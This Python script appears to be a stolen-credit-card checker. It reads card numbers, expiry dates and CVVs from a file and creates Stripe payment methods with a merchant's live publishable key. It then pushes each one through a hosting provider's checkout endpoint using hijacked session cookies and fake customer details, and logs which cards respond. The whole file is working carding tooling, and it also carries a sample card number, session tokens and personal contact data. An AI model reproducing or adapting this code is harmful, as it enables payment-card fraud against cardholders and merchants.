import subprocess
import json

file_path = "data.txt"
def stripe(cc,mes,ano,cvv):
    command = f"""curl 'https://api.stripe.com/v1/payment_methods' \
  -H 'authority: api.stripe.com' \
  -H 'accept: application/json' \
  -H 'accept-language: en-IN,en;q=0.9' \
  -H 'content-type: application/x-www-form-urlencoded' \
  -H 'origin: https://js.stripe.com' \
  -H 'referer: https://js.stripe.com/' \
  -H 'sec-ch-ua: "Google Chrome";v="113", "Chromium";v="113", "Not-A.Brand";v="24"' \
  -H 'sec-ch-ua-mobile: ?0' \
  -H 'sec-ch-ua-platform: "Linux"' \
  -H 'sec-fetch-dest: empty' \
  -H 'sec-fetch-mode: cors' \
  -H 'sec-fetch-site: same-site' \
  -H 'user-agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36' \
  --data-raw 'type=card&card[number]={cc}&card[cvc]={cvv}&card[exp_month]={mes}&card[exp_year]={ano}&guid=fa3c77da-0c72-4738-bb68-d12379c295c13bc4c2&muid=00ed5c21-125e-4f09-b88e-d57f98b1c180331306&sid=591051b6-9ae7-45c4-897c-49372a820717cb36da&pasted_fields=number&payment_user_agent=stripe.js%2Fc68765f93f%3B+stripe-js-v3%2Fc68765f93f%3B+split-card-element&time_on_page=60811&key=pk_live_51NGgofSDY5TRg3X2mykox6Hn39UhMGRqwcyl43jYPi4mgtuY0ifr7quYoi8Y2WySYvJd0SRwUdztaFsmX6ndUNEK00z00rxnYw' \
  --compressed"""
    process = subprocess.Popen(command, stdout=subprocess.PIPE, shell=True)
    output, _ = process.communicate()
    command_output = output.decode()
    json_output = json.loads(command_output)
    payment_method_id = json_output["id"]
    print(payment_method_id)
    with open(file_path,'w') as file:
      file.write(str(cc))
    return payment_method_id

# stripe(5357386252340543,'09',2026,523)

def check(id):
    command = f"""curl 'https://user.homerdp.com/index.php?rp=/stripe/payment/intent' \
  -H 'authority: user.homerdp.com' \
  -H 'accept: application/json, text/javascript, */*; q=0.01' \
  -H 'accept-language: en-IN,en;q=0.9' \
  -H 'content-type: application/x-www-form-urlencoded; charset=UTF-8' \
  -H 'cookie: _gcl_au=1.1.473936557.1689437719; WHMCSGjZzPw8Fgpp7=a8b60ebcacd0de17fa7eab0bf05e8f02; __stripe_mid=00ed5c21-125e-4f09-b88e-d57f98b1c180331306; __stripe_sid=591051b6-9ae7-45c4-897c-49372a820717cb36da; __cf_bm=htUQizrRgch5QFXDi3f1xrZ2YOpT8c3ly8ZM1wbCc8Q-1689437818-0-AYjijMC9a4EnB9WsN9Jgrwf2lWPrSV1flulqptXOoON+GPsYOMbq6XqmxyeoS8ztHQ==; cf_clearance=Wc5CUIAPrX7EqgetKbHvQE6AI5nXVFmghAQptl8LabM-1689437854-0-250; TawkConnectionTime=0; twk_uuid_5f779085f0e7167d0015bf4a=%7B%22uuid%22%3A%221.70gTy2zO8f3JWXZttueAIXCSxlMkB5685R0PFm3zVjn4NxJCg8zQ02ZWeL6dc9Gn60k01TfCUiEUjMa0Bs8qyWil2UWp4R699f4pm1pognaK3hxGJ3cP%22%2C%22version%22%3A3%2C%22domain%22%3A%22homerdp.com%22%2C%22ts%22%3A1689437875984%7D' \
  -H 'origin: https://user.homerdp.com' \
  -H 'referer: https://user.homerdp.com/cart.php?a=checkout&e=false' \
  -H 'sec-ch-ua: "Google Chrome";v="113", "Chromium";v="113", "Not-A.Brand";v="24"' \
  -H 'sec-ch-ua-mobile: ?0' \
  -H 'sec-ch-ua-platform: "Linux"' \
  -H 'sec-fetch-dest: empty' \
  -H 'sec-fetch-mode: cors' \
  -H 'sec-fetch-site: same-origin' \
  -H 'user-agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36' \
  -H 'x-requested-with: XMLHttpRequest' \
  --data-raw 'token=4febfb075848b5770549230fd212ef78dcf76292&submit=true&custtype=new&loginemail=&loginpassword=&firstname=Vrishni&lastname=Pkd&email=pd7886705%40gmail.com&country-calling-code-phonenumber=91&phonenumber=22+2850+2777&companyname=Appu+Pkd&address1=178+%2Cshop+No.%2C+Rangari+Bldg%2C+Dadasaheb+Phalke+Road%2C+Dadar(e)&address2=St+Cross+Lane%2C+Chowpatty&city=Mumbai&state=Maharashtra&postcode=400059&country=IN&password=jimmyjoy44&password2=jimmyjoy44&applycredit=1&paymentmethod=stripe&ccinfo=new&ccdescription=&notes=&marketingoptin=1&payment_method_id={id}' \
  --compressed"""
    process = subprocess.Popen(command, stdout=subprocess.PIPE, shell=True)
    output, _ = process.communicate()
    command_output = output.decode()
    json_output = json.loads(command_output)
    
    print(json_output)
    return json_output



# Open the text file
with open('cc.txt', 'r') as file:
    # Read each line in the file
    for line in file:
        # Remove leading/trailing whitespaces and split the line by '|'
        values = line.strip().split('|')
        
        # Store the values in separate variables
        value1 = values[0]
        value2 = values[1]
        value3 = values[2]
        value4 = values[3]
        idd = stripe(value1, value2, value3, value4)
        da = check(idd)
        with open("output.txt", 'a') as output_file:
            output_file.write(str(line) + str(da) + '\n')

